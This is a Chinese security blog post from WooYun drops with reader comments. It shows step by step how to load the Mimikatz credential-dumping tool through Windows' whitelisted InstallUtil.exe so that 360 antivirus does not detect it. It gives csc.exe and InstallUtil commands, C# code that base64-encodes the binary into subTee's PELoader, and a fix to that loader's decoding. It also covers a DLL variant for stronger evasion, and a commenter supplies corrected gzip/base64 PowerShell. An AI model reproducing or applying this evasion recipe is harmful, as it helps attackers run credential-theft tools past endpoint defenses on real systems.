<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用白名单绕过360实例</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/09/17 10:43" ui-time="" datetime="2015/09/17 10:43" class="published ng-binding ng-isolate-scope">2015/09/17 10:43</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>最近<code>subTee</code>在其博客中介绍了如何利用白名单绕过防护，但细节存在<code>bug</code>，所以本文仅介绍如何修复其<code>bug</code>并利用该方法绕过<code>360</code>，更多利用方法值得探索</p><p>博客链接：</p><p><a href="http://subt0x10.blogspot.hk/">http://subt0x10.blogspot.hk/</a>（需翻墙）</p><p>文章地址：</p><p><a href="http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html">http://subt0x10.blogspot.hk/2015/08/application-whitelisting-bypasses-101.html</a>（需翻墙）</p><h1>0x01 测试目标</h1><p>下载最新版本<code>Mimikatz</code>，实现绕过杀毒软件的查杀。</p><h1>0x02 测试环境</h1><hr><p>操作系统：<code>Win7 x64</code></p><p>mimikatz版本：<code>2.0 alpha 20150906 (oe.eo) edition</code>（目前为止最新）</p><p>下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20150906">https://github.com/gentilkiwi/mimikatz/releases/tag/2.0.0-alpha-20150906</a></p><p>测试日期：9/14/2015</p><h1>0x03 实际测试</h1><hr><p>建议先了解参考链接，链接中提到的相关基础知识不做再次介绍</p><h3>1、下载最新mimikatz，测试查杀情况</h3><p>毫无疑问，被查杀，如图</p><p><img alt="enter image description here" img-src="69796d8ae21d3964223258558a4293054caf4c04.jpg"></p><h3>2、利用InstallUtil.exe执行程序</h3><p><strong>（1）</strong>下载<a href="https://gist.github.com/subTee/00cdac8990584bd2c2fe">https://gist.github.com/subTee/00cdac8990584bd2c2fe</a>并保存为<code>PELoader.cs</code></p><p><strong>（2）</strong>参照博客中的示例，执行如下代码：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs


C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe
</code></pre><p>如图，生成<code>PELoader.exe</code>，然后通过<code>InstallUtil.exe</code>执行<code>PELoader.exe</code></p><p><img alt="enter image description here" img-src="391823870a22619e1324a908535b8c9fff2b3894.jpg"></p><p><img alt="enter image description here" img-src="6a9025dd50d3e25f75df5ae25432d6992f6396d3.jpg"></p><p><img alt="enter image description here" img-src="4e4c8a461d56fa0875ceacf644dd5592b15a9d07.jpg"></p><p>成功加载运行<code>mimikatz</code></p><p>进程显示为<code>InstallUtil.exe</code>，如图</p><p><img alt="enter image description here" img-src="3b7f2b78487d9aea67f75b8e2dbbaed16b2b4478.jpg"></p><p><strong>（3）</strong>测试生成的<code>PELoader.exe</code>查杀情况</p><p>如图，360成功检测威胁</p><p><img alt="enter image description here" img-src="4e454286d9efab58a98e83f8bec1c062a9dc5a37.jpg"></p><p><strong>（4）</strong>尝试修改<code>PELoader.cs</code></p><p>阅读代码发现<code>Line853-856</code>存储了<code>base64</code>加密后的mimikatz</p><p><img alt="enter image description here" img-src="72f1b1b6879aa2048aa71a96a370f70ff001a010.jpg"></p><p>那么参照作者给出的修改方法修改</p><p>作者给出的修改方法如下：</p><pre><code>* Base64 Encode Mimikatz In PowerShell-  $fileName = "mimikatz.exe" $fileContent = get-content $fileName $fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent) $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes) $fileContentEncoded | set-content ($fileName + ".b64")  * 
[OR] 
byte[] AsBytes = File.ReadAllBytes(@"C:\Tools\Mimikatz.exe"); String AsBase64String = Convert.ToBase64String(AsBytes); StreamWriter sw = new StreamWriter(@"C:\Tools\Mimikatz.b64"); sw.Write(AsBase64String); sw.Close();  *
</code></pre><p><strong>（5）</strong>测试<code>Base64 Encode Mimikatz In PowerShell</code></p><p>按照作者给出的方法对<code>mimikatz</code>作<code>base64</code>编码并保存在Mimikatz.b64文件中</p><p>如图</p><p><img alt="enter image description here" img-src="62a2dd08114d53dd828ee1d26008bcd6ff766a27.jpg"></p><p>执行<code>Powershell</code>代码</p><p>执行后生成<code>Mimikatz.b64</code>，如图</p><p><img alt="enter image description here" img-src="3018bee91f712e7cc1b881ce4c036f1e1f63d464.jpg"></p><p>打开将内容复制到<code>PELoader.cs</code>中的变量<code>KatzCompressed</code>的定义中，如图</p><p><img alt="enter image description here" img-src="7786fdce990ac5f974fce448290f1df05da0ec57.jpg"></p><p>按照步骤（2）执行测试，发现错误，如图</p><p><img alt="enter image description here" img-src="e44eb47297b0e129ed9a0268223bf1032c8250d1.jpg"></p><h1>0x04 分析</h1><hr><p>作者给出的实例代码如果无法修改，未免太鸡肋，必须找到修改方法，实现执行任意程序</p><h1>0x05 解决方案</h1><hr><p>在做了多次实验并研究代码后成功找到了错误原因：</p><p><code>Powershell</code>作<code>base64</code>编码同<code>c#</code>对<code>base64</code>解码之间存在解析错误</p><p>解决步骤：</p><p><strong>（1）</strong>使用c#对mimikatz作base64加密</p><p>代码如下：</p><pre><code>using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace test1
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] AsBytes = File.ReadAllBytes(@"C:\testcs\mimikatz.exe");
            String AsBase64String = Convert.ToBase64String(AsBytes);
            StreamWriter sw = new StreamWriter(@"C:\testcs\mimikatz.b64");
            sw.Write(AsBase64String);
            sw.Close();
        }
    }
}
</code></pre><p>我使用的环境是<code>vs2012</code>，新建<code>c#</code>工程，填写以上代码，编译后运行，生成新的<code>mimikatz.b64</code>，如图</p><p><img alt="enter image description here" img-src="86d2045f68a2e3422ea9cdcda2c4eb1bda13d76b.jpg"></p><p>细心的同学可以发现和之前使用<code>Powershell</code>生成的<code>mimikatz.b64</code>有所区别</p><p><strong>（2）</strong>替换变量<code>KatzCompressed</code>的定义内容</p><p>如图</p><p><img alt="enter image description here" img-src="d84ae1ac3b9785ad3b23c26b63c64642a549b36a.jpg"></p><p><strong>（3）</strong>修改解密过程</p><p>定位<code>PELoader.cs</code> Line106，去掉</p><pre><code>byte[] decompressed = Decompress(FromBase64);
</code></pre><p>在前面添加“//”即可，如图</p><p><img alt="enter image description here" img-src="d0278d24192ad21ca4c7dfe8066780af1b562439.jpg"></p><p><strong>（4）</strong>再次编译并利用<code>InstallUtil.exe</code>执行</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:PELoader.exe PELoader.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.exe
</code></pre><p>如图</p><p><img alt="enter image description here" img-src="ca348a465c8f6aae2db32110af8cb3896ee67f1d.jpg"></p><p>证明修改成功，能够顺利执行我们修改的代码</p><p><strong>（5）</strong>增强免杀</p><p>采用如下生成步骤：</p><pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /target:library /out:PELoader.dll PELoader.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PELoader.dll
</code></pre><p>如图</p><p><img alt="enter image description here" img-src="2f056490953bffaca4271716c16c0d36ae6199e8.jpg"></p><p>也可以成功加载<code>mimikatz</code></p><p>测试查杀情况</p><p>如图</p><p><img alt="enter image description here" img-src="2d3bc24b82a046c328bab9a2418b7b0a60673f5e.jpg"></p><p><img alt="enter image description here" img-src="151928a7b4bc53f760f75f600986868d91ed9c33.jpg"></p><p><img alt="enter image description here" img-src="ea23c02e3cd17796543fab4fb23705b956558318.jpg"></p><p><img alt="enter image description here" img-src="b0abe6404b2a2ab5e8e60c2da35691535ebbe4bc.jpg"></p><p><img alt="enter image description here" img-src="f9e7b3d82026449e36e413c9f5f70511004b6363.jpg"></p><p><img alt="enter image description here" img-src="4232c0a2c52cc276636e21d488bb276685a6e783.jpg"></p><p><strong>注：</strong>测试全过程开启360，主动防御未触发</p><h1>0x06 小结</h1><hr><p>通过<code>InstallUtil.exe</code>执行程序的方法不仅可使程序逃过杀毒软件的查杀，更能够规避程序运行白名单的限制，其他操作系统下的情况有所不同，更多细节值得研究。</p><p>参照<code>zone</code>中大家的建议，希望这篇文章是大家喜欢看到的类型：）</p><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/8862" rel="bookmark" id="re1">利用白名单绕过限制的更多测试</a></li><li><a href="http://drops.wooyun.org/tips/12670" rel="bookmark" id="re2">域渗透——Skeleton Key</a></li><li><a href="http://drops.wooyun.org/tips/6199" rel="bookmark" id="re3">powershell各种反弹姿势以及取证（二）</a></li><li><a href="http://drops.wooyun.org/tips/12518" rel="bookmark" id="re4">域渗透——Security Support Provider</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tellyousth</span> <span class="reply-time">2016-03-19 17:44:58</span></div><p></p><p>楼主的文章很精彩，受用不小。但有一点我觉得是这样的，首先人家原始代码并没有任何问题，你之所以用powershell的代码生成出来的执行会失败，主要是因为以下两点：<br>1.人家源码里是纯二进制字节操作，但是你的powershell代码中却以utf8格式进行了编码读取，人家源码里并没有处理utf8编码的代码，所以还原的时候出现了问题。<br>2.人家源码明确写了在base64编码之后还要进行gzip解压缩，但是你的powershell代码并没有进行gzip压缩，所以可能也会造成还原的时候出错。<br>所以，正确的powershell代码应该是这样的：<br>$memstream = New-Object System.IO.MemoryStream<br>$gzipstream = New-Object System.IO.Compression.GZipStream($memstream,[System.IO.Compression.CompressionMode]::Compress,$True)<br>$bytes = [System.IO.File]::ReadAllBytes(&#039;c:\projects\test.exe&#039;)<br>$gzipstream.Write($bytes,0,$bytes.length)<br>[System.Convert]::ToBase64String($memstream.ToArray()) | Set-Content &#039;c:\projects\test.b64&#039;</p><p>不对之处还请指正</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Fnut</span> <span class="reply-time">2015-10-10 16:22:59</span></div><p></p><p>请问这个具体是利用了什么原理才绕过了360的检测呢</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-09-21 10:55:16</span></div><p></p><p>@我是绕不过<br>下篇文章会有更多的测试详情<br>你没有提到你的操作系统版本环境，抱歉无法回答你的问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DC3</span> <span class="reply-time">2015-09-18 13:03:23</span></div><p></p><p>远控的木马能用这方法不？感觉有点不行啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">珈蓝夜宇</span> <span class="reply-time">2015-09-17 10:48:17</span></div><p></p><p>换个ID刷drops,居然发现了好东西~欧耶</p><p></p></div></div></div></div></div></main>